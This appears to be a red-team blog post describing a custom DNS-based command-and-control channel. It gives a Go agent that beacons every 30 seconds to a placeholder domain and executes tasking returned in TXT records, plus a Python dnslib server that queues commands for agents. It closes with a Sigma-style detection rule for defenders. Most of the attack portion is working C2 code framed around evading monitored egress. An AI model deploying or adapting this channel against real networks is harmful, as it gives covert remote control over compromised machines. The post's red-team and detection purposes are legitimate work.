---
title: "Building a Custom C2 Channel Over DNS: Lessons from the Lab"
slug: "c2-over-dns"
date: "2026-01-28"
tags: ["tooling", "go", "evasion"]
---

Off-the-shelf C2 frameworks are powerful, but they come with known signatures. When you need to blend into normal network traffic, building your own channel is sometimes the only option.

I recently prototyped a DNS-based C2 channel in Go for use in red team engagements where HTTP/HTTPS egress was heavily monitored. This post covers the architecture, the trade-offs, and what I learned about DNS tunneling at the protocol level.

## Why DNS?

DNS is almost always allowed outbound, even in heavily restricted environments. By encoding commands and responses in DNS queries and TXT records, you can maintain a low-and-slow communication channel that's surprisingly hard to detect without dedicated DNS analytics.

## The Go implementation

I chose Go for its excellent cross-compilation support and small binary sizes. The agent compiles to a single static binary under 3MB that runs on Windows, Linux, and macOS.

The core of the agent is a DNS resolver that encodes tasking data into subdomain labels and reads responses from TXT records:

```go
package main

import (
	"encoding/base32"
	"fmt"
	"net"
	"strings"
	"time"
)

const c2Domain = "cdn-telemetry.example.com"

func beacon(agentID string, data []byte) (string, error) {
	encoded := base32.StdEncoding.EncodeToString(data)
	encoded = strings.TrimRight(strings.ToLower(encoded), "=")

	qname := fmt.Sprintf("%s.%s.%s", encoded, agentID, c2Domain)

	records, err := net.LookupTXT(qname)
	if err != nil {
		return "", fmt.Errorf("dns lookup failed: %w", err)
	}
	return strings.Join(records, ""), nil
}

func main() {
	for {
		resp, err := beacon("agent-0a3f", []byte("checkin"))
		if err == nil && resp != "NOP" {
			execute(resp)
		}
		time.Sleep(30 * time.Second)
	}
}
```

On the server side, a Python handler parses the incoming queries and queues commands:

```python
from dnslib import DNSRecord, RR, QTYPE, TXT
from dnslib.server import DNSServer, BaseResolver

class C2Resolver(BaseResolver):
    def __init__(self):
        self.task_queue = {}

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")
        labels = qname.split(".")

        agent_id = labels[-3]
        payload = labels[0]

        task = self.task_queue.pop(agent_id, "NOP")
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(task), ttl=0))
        return reply

if __name__ == "__main__":
    resolver = C2Resolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    server.start()
```

## Detection considerations

From a blue team perspective, this traffic creates anomalies that are detectable with the right tooling. High-entropy subdomain labels and unusual TXT query volumes are strong indicators. During the engagement debrief, we recommended the SOC add the following Sigma-style detection logic:

```yaml
title: Suspicious DNS TXT Query Volume
status: experimental
logsource:
  category: dns
detection:
  selection:
    query_type: TXT
  condition: selection | count(query) by src_ip > 50
  timeframe: 5m
level: medium
```

## Takeaways

Building your own C2 channel is an invaluable learning exercise. It forces you to think at the protocol level — how data is encoded, how beaconing intervals affect detection, and how defenders can fingerprint custom tooling. Every red teamer should build at least one from scratch.
